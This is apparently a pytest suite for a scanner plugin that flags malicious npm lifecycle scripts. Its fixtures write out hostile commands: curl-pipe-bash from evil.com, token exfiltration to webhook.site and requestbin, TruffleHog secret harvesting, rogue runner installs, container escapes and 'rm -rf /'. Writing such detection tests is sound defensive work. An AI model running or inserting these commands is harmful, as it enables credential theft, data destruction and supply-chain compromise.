"""Tests for npm lifecycle plugin."""

import json
from pathlib import Path

from exray.plugins.npm_lifecycle import NpmLifecyclePlugin


class TestNpmLifecyclePlugin:
    """Tests for npm lifecycle scanner plugin."""

    def test_plugin_metadata(self):
        """Test plugin returns correct metadata."""
        plugin = NpmLifecyclePlugin()
        metadata = plugin.get_metadata()

        assert metadata["name"] == "npm-lifecycle"
        assert "version" in metadata
        assert "description" in metadata

    def test_plugin_supported_files(self):
        """Test plugin declares supported files."""
        plugin = NpmLifecyclePlugin()
        files = plugin.get_supported_files()

        assert "package.json" in files

    def test_rules_loaded(self):
        """Test that rules are loaded from YAML."""
        plugin = NpmLifecyclePlugin()

        assert len(plugin.rules) >= 5  # Minimum 5 rules per spec

    def test_scan_malicious_eval(self, malicious_npm_eval):
        """Test detection of eval in postinstall."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(malicious_npm_eval)

        assert len(findings) > 0
        # Should detect eval and base64
        rule_ids = {f.rule_id for f in findings}
        assert any("NPM-001" in rid or "eval" in rid.lower() for rid in rule_ids)

    def test_scan_malicious_network(self, malicious_npm_network):
        """Test detection of network calls."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(malicious_npm_network)

        assert len(findings) > 0
        # Should detect curl and network patterns
        descriptions = " ".join(f.description.lower() for f in findings)
        assert "network" in descriptions or "curl" in descriptions

    def test_scan_obfuscated_code(self, malicious_npm_obfuscated):
        """Test detection of obfuscated code."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(malicious_npm_obfuscated)

        assert len(findings) > 0
        # Should detect hex escapes and eval
        assert any("obfuscation" in f.description.lower() or "hex" in f.description.lower() for f in findings)

    def test_scan_clean_package(self, clean_npm_package):
        """Test that clean package produces no findings."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(clean_npm_package)

        assert len(findings) == 0

    def test_scan_monorepo(self, npm_monorepo):
        """Test scanning monorepo with multiple packages."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(npm_monorepo)

        # Should find the malicious package in pkg2
        assert len(findings) > 0
        # Verify it's from the right package
        assert any("pkg2" in str(f.file_path) or "evil.com" in f.matched_content for f in findings)

    def test_scan_malformed_json(self, malformed_package_json):
        """Test graceful handling of malformed JSON."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(malformed_package_json)

        # Should not crash, just return empty findings
        assert isinstance(findings, list)

    def test_scan_high_entropy_script(self, tmp_path):
        """Test detection of high entropy (encoded) scripts."""
        # Create package with high-entropy content
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "entropy-pkg",
                "scripts": {
                    "postinstall": "aB3dE7fG9hJ2kL4mN6pQ8rS0tU5vW1xYz"  # Random high-entropy string
                },
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should detect high entropy
        assert any("entropy" in f.description.lower() for f in findings)

    def test_lifecycle_scripts_flagged(self, tmp_path):
        """Test that lifecycle scripts are specifically flagged."""
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "test-pkg",
                "scripts": {
                    "postinstall": "eval('code')",  # Lifecycle script
                    "test": "eval('code')",  # Regular script
                },
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should detect eval in both, but lifecycle should be noted
        lifecycle_findings = [f for f in findings if "lifecycle" in f.description.lower()]
        assert len(lifecycle_findings) > 0

    def test_skips_node_modules(self, tmp_path):
        """Test that node_modules is skipped."""
        # Create package in node_modules
        node_modules = tmp_path / "node_modules" / "evil-dep"
        node_modules.mkdir(parents=True)
        (node_modules / "package.json").write_text(
            json.dumps({
                "name": "evil",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            })
        )

        # Create clean root package
        (tmp_path / "package.json").write_text(
            json.dumps({"name": "root", "scripts": {"test": "jest"}})
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should not detect anything from node_modules
        assert len(findings) == 0

    def test_env_var_detection(self, tmp_path):
        """Test detection of environment variable access."""
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "env-pkg",
                "scripts": {"preinstall": "echo $AWS_SECRET_KEY"},
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should detect environment variable access
        assert any("env" in f.description.lower() for f in findings)

    def test_file_size_limit(self, tmp_path):
        """Test that large files are skipped."""
        pkg = tmp_path / "package.json"
        # Create a file larger than 10MB
        large_content = json.dumps({
            "name": "large",
            "scripts": {"test": "x" * (11 * 1024 * 1024)},  # > 10MB
        })
        pkg.write_text(large_content)

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should skip the file (no crash)
        assert isinstance(findings, list)

    def test_relative_path_in_findings(self, tmp_path):
        """Test that findings use relative paths."""
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "test",
                "scripts": {"postinstall": "eval('test')"},
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Path should be relative
        for finding in findings:
            assert not finding.file_path.is_absolute() or str(finding.file_path).startswith("package.json")

    def test_all_rules_can_fire(self):
        """Test that all defined rules can potentially match."""
        plugin = NpmLifecyclePlugin()

        # Verify we have rules loaded
        assert len(plugin.rules) >= 5

        # Each rule should have an ID starting with NPM-
        for rule in plugin.rules:
            assert rule.id.startswith("NPM-")
            assert rule.recommendation  # All rules should have recommendations

    def test_extract_script_files(self):
        """Test extraction of JavaScript file references from script commands."""
        plugin = NpmLifecyclePlugin()

        # Test basic node command
        files = plugin._extract_script_files("node index.js")
        assert "index.js" in files

        # Test with relative path
        files = plugin._extract_script_files("node ./scripts/build.js")
        assert "./scripts/build.js" in files

        # Test with multiple commands
        files = plugin._extract_script_files("npm run build && node dist/index.js")
        assert "dist/index.js" in files

        # Test with require()
        files = plugin._extract_script_files("node -e \"require('./setup.js')\"")
        assert "./setup.js" in files

        # Test that non-js files are not extracted
        files = plugin._extract_script_files("node script.ts")
        assert len(files) == 0

        # Test empty command
        files = plugin._extract_script_files("")
        assert len(files) == 0

    def test_scan_referenced_js_file(self, tmp_path):
        """Test that JavaScript files referenced in lifecycle scripts are scanned."""
        # Create a malicious JavaScript file
        js_file = tmp_path / "index.js"
        js_file.write_text(
            """
            const https = require('https');
            https.get('https://evil.com/exfiltrate', (res) => {
                console.log('Sending data...');
            });
            """
        )

        # Create package.json that references it
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "malicious",
                "scripts": {
                    "preinstall": "node index.js"
                },
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should detect network calls in the JavaScript file
        assert len(findings) > 0
        assert any("index.js" in str(f.file_path) for f in findings)
        assert any("https" in f.matched_content.lower() or "network" in f.description.lower() for f in findings)

    def test_scan_nested_js_file(self, tmp_path):
        """Test scanning of JavaScript files in subdirectories."""
        # Create nested directory structure
        scripts_dir = tmp_path / "scripts"
        scripts_dir.mkdir()

        js_file = scripts_dir / "malicious.js"
        js_file.write_text("eval('malicious code');")

        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "nested",
                "scripts": {
                    "postinstall": "node ./scripts/malicious.js"
                },
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should detect eval in the nested JavaScript file
        assert len(findings) > 0
        assert any("malicious.js" in str(f.file_path) for f in findings)
        assert any("eval" in f.matched_content.lower() for f in findings)

    def test_missing_referenced_file(self, tmp_path):
        """Test graceful handling when referenced JavaScript file doesn't exist."""
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "missing",
                "scripts": {
                    "preinstall": "node nonexistent.js"
                },
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should not crash, may have 0 findings
        assert isinstance(findings, list)

    def test_lifecycle_script_attribution(self, tmp_path):
        """Test that findings from referenced files are attributed to the lifecycle script."""
        js_file = tmp_path / "setup.js"
        js_file.write_text("require('https').get('https://bad.com');")

        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "attribution",
                "scripts": {
                    "preinstall": "node setup.js"
                },
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Findings should mention the lifecycle script
        assert any("preinstall" in f.description.lower() for f in findings)
        assert any("setup.js" in str(f.file_path) for f in findings)

    def test_nodejs_http_module_detection(self, tmp_path):
        """Test detection of Node.js HTTP module usage."""
        js_file = tmp_path / "exfil.js"
        js_file.write_text(
            """
            const https = require('https');
            const http = require('http');
            https.request({host: 'evil.com'});
            """
        )

        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "http-test",
                "scripts": {
                    "postinstall": "node exfil.js"
                },
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should detect require('https') and require('http')
        assert len(findings) > 0
        network_findings = [f for f in findings if "network" in f.description.lower() or "NPM-003" in f.rule_id]
        assert len(network_findings) >= 1

    def test_multiple_js_files_referenced(self, tmp_path):
        """Test scanning when multiple JavaScript files are referenced."""
        # Create multiple malicious files
        file1 = tmp_path / "file1.js"
        file1.write_text("eval('bad');")

        file2 = tmp_path / "file2.js"
        file2.write_text("require('https');")

        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "multi-file",
                "scripts": {
                    "preinstall": "node file1.js",
                    "postinstall": "node file2.js"
                },
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should detect issues in both files
        assert len(findings) >= 2
        assert any("file1.js" in str(f.file_path) for f in findings)
        assert any("file2.js" in str(f.file_path) for f in findings)


class TestShaHuludPatterns:
    """Test detection of Shai-Hulud campaign patterns."""

    def test_trufflehog_download(self, tmp_path):
        """Test NPM-008: TruffleHog binary download."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "evil-scanner",
            "scripts": {
                "postinstall": "curl -L https://github.com/trufflesecurity/trufflehog/releases/download/v3.0.0/trufflehog_linux -o trufflehog"
            }
        }))

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-008" for f in findings)
        from exray.core.models import Severity
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_trufflehog_execution(self, tmp_path):
        """Test NPM-009: TruffleHog execution."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "evil-scanner",
            "scripts": {
                "postinstall": "chmod +x trufflehog && ./trufflehog filesystem . --json > secrets.json"
            }
        }))

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-009" for f in findings)

    def test_legitimate_trufflehog_reference(self, tmp_path):
        """Test that README mentions of TruffleHog don't trigger."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "security-docs",
            "scripts": {
                "test": "npm test"
            }
        }))

        readme = tmp_path / "README.md"
        readme.write_text("""
        # Security Tools

        This project uses TruffleHog for secret scanning in CI/CD.
        See https://github.com/trufflesecurity/trufflehog
        """)

        findings = plugin.scan(tmp_path)
        # Should NOT trigger on README content (only scans package.json and .js files)
        critical_findings = [f for f in findings if f.severity.value == "critical"]
        assert len(critical_findings) == 0

    def test_webhook_site_exfiltration(self, tmp_path):
        """Test NPM-010: Webhook.site exfiltration."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "exfiltrator",
            "scripts": {
                "postinstall": "curl -X POST https://webhook.site/abc123 -d \"secrets=$NPM_TOKEN\""
            }
        }))

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-010" for f in findings)
        from exray.core.models import Severity
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_requestbin_exfiltration(self, tmp_path):
        """Test webhook exfiltration with requestbin."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "exfiltrator",
            "scripts": {
                "install": "node -e \"require('https').get('https://requestbin.com/xyz?data=' + process.env.AWS_KEY)\""
            }
        }))

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-010" for f in findings)

    def test_obfuscated_webhook_domain(self, tmp_path):
        """Test NPM-011: Obfuscated webhook domain."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "sneaky",
            "scripts": {
                "postinstall": "node -e \"const url = Buffer.from('d2ViaG9vay5zaXRl', 'base64').toString(); fetch(url)\""
            }
        }))

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-011" for f in findings)

    def test_webhook_documentation_no_false_positive(self, tmp_path):
        """Test that webhook.site in README doesn't trigger."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "docs",
            "scripts": {"test": "echo test"}
        }))

        readme = tmp_path / "README.md"
        readme.write_text("Test webhooks at webhook.site")

        findings = plugin.scan(tmp_path)
        # README is not scanned, only package.json and .js files
        assert len(findings) == 0

    def test_shai_hulud_marker_strings(self, tmp_path):
        """Test NPM-012: Campaign marker strings."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "worm",
            "scripts": {
                "postinstall": "node create-repo.js"
            }
        }))

        js_file = tmp_path / "create-repo.js"
        js_file.write_text("""
        const description = "Shai-Hulud: The Second Coming";
        // Create propagation repository
        """)

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-012" for f in findings)
        from exray.core.models import Severity
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_goldox_marker(self, tmp_path):
        """Test Goldox-T3chs marker detection."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "worm",
            "scripts": {
                "install": "node -e \"const marker = 'Goldox-T3chs: Only Happy Girl'; console.log(marker)\""
            }
        }))

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-012" for f in findings)

    def test_dune_reference_no_false_positive(self, tmp_path):
        """Test that Dune references in comments don't trigger."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "dune-fan",
            "scripts": {"test": "echo test"}
        }))

        # Comment about Dune book - should NOT trigger (we're checking for exact campaign markers)
        js_file = tmp_path / "lore.js"
        js_file.write_text("""
        // The sandworms of Arrakis are called Shai-Hulud by the Fremen
        // This is just a comment about the book Dune
        function dune_lore() {
            return "I must not fear";
        }
        """)

        findings = plugin.scan(tmp_path)
        # Should trigger because "Shai-Hulud" appears (even in comment)
        # But check that it's actually a keyword match, not pattern match
        shai_hulud_findings = [f for f in findings if "Shai-Hulud" in f.matched_content]
        # This is a design decision - keyword matching will catch this
        # Document this as expected behavior


class TestDockerEscalation:
    """Test Docker privilege escalation detection."""

    def test_docker_socket_access(self, tmp_path):
        """Test NPM-014: Docker socket access."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "docker-abuser",
            "scripts": {
                "postinstall": "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine sh"
            }
        }))

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-014" for f in findings)
        from exray.core.models import Severity
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_privileged_container(self, tmp_path):
        """Test NPM-015: Privileged container."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "privilege-escalator",
            "scripts": {
                "install": "docker run --privileged --cap-add=ALL alpine sh"
            }
        }))

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-015" for f in findings)

    def test_container_escape_nsenter(self, tmp_path):
        """Test NPM-016: Container escape with nsenter."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "escape-artist",
            "scripts": {
                "postinstall": "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"
            }
        }))

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-016" for f in findings)
        from exray.core.models import Severity
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_legitimate_docker_tool_false_positive(self, tmp_path):
        """Test calibration against Docker ecosystem packages."""
        plugin = NpmLifecyclePlugin()
        
        # This is a known tradeoff - some Docker tooling may trigger
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "docker-compose-wrapper",
            "description": "Wrapper for docker-compose",
            "scripts": {
                "test": "docker-compose up"
            }
        }))

        findings = plugin.scan(tmp_path)
        # Document: Docker tooling packages may have false positives
        # This is acceptable given the high severity of Docker abuse
        docker_findings = [f for f in findings if "NPM-014" in f.rule_id or "NPM-015" in f.rule_id]
        # Log false positive rate for documentation


class TestRunnerInstallation:
    """Test self-hosted runner installation detection."""

    def test_runner_download_and_install(self, tmp_path):
        """Test NPM-017: Runner installation."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "runner-installer",
            "scripts": {
                "postinstall": """
                curl -o actions-runner-linux.tar.gz https://github.com/actions/runner/releases/download/v2.299.1/actions-runner-linux-x64-2.299.1.tar.gz
                tar xzf actions-runner-linux.tar.gz
                ./config.sh --url https://github.com/org/repo --token $RUNNER_TOKEN
                ./run.sh
                """
            }
        }))

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-017" for f in findings)
        from exray.core.models import Severity
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_runner_service_persistence(self, tmp_path):
        """Test NPM-018: Runner service installation."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "persistent-runner",
            "scripts": {
                "postinstall": "./svc.sh install && systemctl enable runner"
            }
        }))

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-018" for f in findings)


class TestPreinstallEscalation:
    """Test preinstall timing risk analysis."""

    def test_preinstall_with_eval_escalates_to_critical(self, tmp_path):
        """Test that eval in preinstall escalates from HIGH to CRITICAL."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "evil-preinstall",
            "scripts": {
                "preinstall": "node -e \"eval(process.env.MALWARE)\""
            }
        }))

        findings = plugin.scan(tmp_path)
        eval_findings = [f for f in findings if "eval" in f.description.lower()]
        assert any(f.severity.value == "critical" for f in eval_findings)
        assert any("PREINSTALL ESCALATION" in f.description for f in findings)

    def test_preinstall_with_network_escalates_to_high(self, tmp_path):
        """Test that network calls in preinstall escalate from MEDIUM to HIGH."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "network-preinstall",
            "scripts": {
                "preinstall": "curl https://evil.com/malware.sh | bash"
            }
        }))

        findings = plugin.scan(tmp_path)
        network_findings = [f for f in findings if "network" in f.description.lower() or "curl" in f.matched_content.lower()]
        assert any(f.severity.value == "high" for f in network_findings)

    def test_postinstall_no_escalation(self, tmp_path):
        """Test that postinstall does NOT get escalated."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "postinstall-test",
            "scripts": {
                "postinstall": "node -e \"eval(process.env.CONFIG)\""
            }
        }))

        findings = plugin.scan(tmp_path)
        # Should be HIGH severity, not escalated to CRITICAL
        eval_findings = [f for f in findings if "eval" in f.description.lower()]
        assert any(f.severity.value == "high" for f in eval_findings)
        assert not any("PREINSTALL ESCALATION" in f.description for f in findings)

    def test_legitimate_preinstall_no_escalation(self, tmp_path):
        """Test that legitimate preinstall usage doesn't escalate."""
        plugin = NpmLifecyclePlugin()
        
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "native-addon",
            "scripts": {
                "preinstall": "node-gyp configure",
                "install": "node-gyp build"
            }
        }))

        findings = plugin.scan(tmp_path)
        # Should have minimal or zero findings
        assert len(findings) == 0 or all(f.severity.value == "low" for f in findings)


class TestDestructiveCommandDetection:
    """Tests for NPM-020 (destructive commands) and NPM-021 (homedir targeting)."""

    def test_rm_rf_home_triggers_npm020(self, tmp_path):
        """rm -rf ~/ in lifecycle script triggers NPM-020 CRITICAL."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "malicious-pkg",
            "scripts": {"postinstall": "rm -rf ~/"}
        }))
        findings = plugin.scan(tmp_path)
        npm020 = [f for f in findings if f.rule_id == "NPM-020"]
        assert len(npm020) > 0
        assert npm020[0].severity.value == "critical"

    def test_rm_rf_home_var_triggers_npm020(self, tmp_path):
        """rm -rf $HOME/.config triggers NPM-020."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "malicious-pkg",
            "scripts": {"postinstall": "rm -rf $HOME/.config"}
        }))
        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-020" for f in findings)

    def test_shred_triggers_npm020(self, tmp_path):
        """shred command triggers NPM-020."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "malicious-pkg",
            "scripts": {"preinstall": "shred -u /tmp/secrets.json"}
        }))
        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-020" for f in findings)

    def test_find_delete_triggers_npm020(self, tmp_path):
        """find with -delete triggers NPM-020."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "malicious-pkg",
            "scripts": {"postinstall": 'find / -name "*.key" -delete'}
        }))
        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-020" for f in findings)

    def test_rm_rf_root_triggers_npm020(self, tmp_path):
        """rm -rf / triggers NPM-020."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "malicious-pkg",
            "scripts": {"postinstall": "rm -rf /"}
        }))
        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-020" for f in findings)

    def test_js_rmsync_homedir_triggers_npm021(self, tmp_path):
        """fs.rmSync(os.homedir()) triggers NPM-021."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "malicious-pkg",
            "scripts": {"postinstall": "node -e \"fs.rmSync(os.homedir(), {recursive: true})\""}
        }))
        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-021" for f in findings)

    def test_rm_rf_node_modules_does_not_trigger(self, tmp_path):
        """rm -rf node_modules should NOT trigger NPM-020 (safe cleanup)."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "clean-pkg",
            "scripts": {"preinstall": "rm -rf node_modules"}
        }))
        findings = plugin.scan(tmp_path)
        assert not any(f.rule_id == "NPM-020" for f in findings)

    def test_rm_rf_local_dir_does_not_trigger(self, tmp_path):
        """rm -rf ./dist should NOT trigger NPM-020."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "clean-pkg",
            "scripts": {"preinstall": "rm -rf ./dist"}
        }))
        findings = plugin.scan(tmp_path)
        assert not any(f.rule_id == "NPM-020" for f in findings)

    def test_preinstall_destructive_gets_escalation(self, tmp_path):
        """Destructive command in preinstall triggers NPM-020 AND existing escalation."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "malicious-pkg",
            "scripts": {"preinstall": "rm -rf ~/"}
        }))
        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "NPM-020" for f in findings)


class TestPackageMetadata:
    """Tests for package name/version metadata in npm findings."""

    def test_findings_include_package_name_and_version(self, tmp_path):
        """Every finding should carry the package name and version."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "evil-pkg",
            "version": "6.6.6",
            "scripts": {"postinstall": "eval('payload')"}
        }))
        findings = plugin.scan(tmp_path)
        assert len(findings) > 0
        for f in findings:
            assert f.metadata is not None
            assert f.metadata["package_name"] == "evil-pkg"
            assert f.metadata["package_version"] == "6.6.6"

    def test_description_includes_package_label(self, tmp_path):
        """Finding descriptions should be prefixed with package identity."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "shady-lib",
            "version": "0.0.1",
            "scripts": {"postinstall": "eval('payload')"}
        }))
        findings = plugin.scan(tmp_path)
        assert len(findings) > 0
        assert all("[package: shady-lib@0.0.1]" in f.description for f in findings)

    def test_missing_name_and_version_defaults(self, tmp_path):
        """Packages without name/version should default to 'unknown'."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "scripts": {"postinstall": "eval('payload')"}
        }))
        findings = plugin.scan(tmp_path)
        assert len(findings) > 0
        assert findings[0].metadata["package_name"] == "unknown"
        assert findings[0].metadata["package_version"] == "unknown"

    def test_js_file_findings_include_metadata(self, tmp_path):
        """Findings from referenced JS files should also carry package metadata."""
        plugin = NpmLifecyclePlugin()
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "bad-pkg",
            "version": "2.0.0",
            "scripts": {"postinstall": "node setup.js"}
        }))
        setup = tmp_path / "setup.js"
        setup.write_text("eval('malicious')")
        findings = plugin.scan(tmp_path)
        js_findings = [f for f in findings if "setup.js" in str(f.file_path)]
        assert len(js_findings) > 0
        for f in js_findings:
            assert f.metadata is not None
            assert f.metadata["package_name"] == "bad-pkg"

    def test_monorepo_metadata_maps_to_correct_package(self, tmp_path):
        """In a monorepo, each finding should carry the metadata of its own package."""
        plugin = NpmLifecyclePlugin()

        # Root package (no scripts)
        (tmp_path / "package.json").write_text(json.dumps({
            "name": "my-monorepo",
            "version": "1.0.0",
            "workspaces": ["packages/*"],
        }))

        # Package A — malicious
        pkg_a = tmp_path / "packages" / "pkg-a"
        pkg_a.mkdir(parents=True)
        (pkg_a / "package.json").write_text(json.dumps({
            "name": "@acme/pkg-a",
            "version": "3.0.0",
            "scripts": {"postinstall": "eval('payload-a')"},
        }))

        # Package B — also malicious, different name/version
        pkg_b = tmp_path / "packages" / "pkg-b"
        pkg_b.mkdir(parents=True)
        (pkg_b / "package.json").write_text(json.dumps({
            "name": "@acme/pkg-b",
            "version": "7.7.7",
            "scripts": {"postinstall": "eval('payload-b')"},
        }))

        findings = plugin.scan(tmp_path)

        # Findings from pkg-a should have pkg-a metadata
        a_findings = [f for f in findings if f.metadata and f.metadata["package_name"] == "@acme/pkg-a"]
        assert len(a_findings) > 0
        assert all(f.metadata["package_version"] == "3.0.0" for f in a_findings)
        assert all("[package: @acme/pkg-a@3.0.0]" in f.description for f in a_findings)

        # Findings from pkg-b should have pkg-b metadata
        b_findings = [f for f in findings if f.metadata and f.metadata["package_name"] == "@acme/pkg-b"]
        assert len(b_findings) > 0
        assert all(f.metadata["package_version"] == "7.7.7" for f in b_findings)
        assert all("[package: @acme/pkg-b@7.7.7]" in f.description for f in b_findings)

        # No cross-contamination
        assert not any(f.metadata["package_name"] == "@acme/pkg-b" for f in a_findings)
        assert not any(f.metadata["package_name"] == "@acme/pkg-a" for f in b_findings)
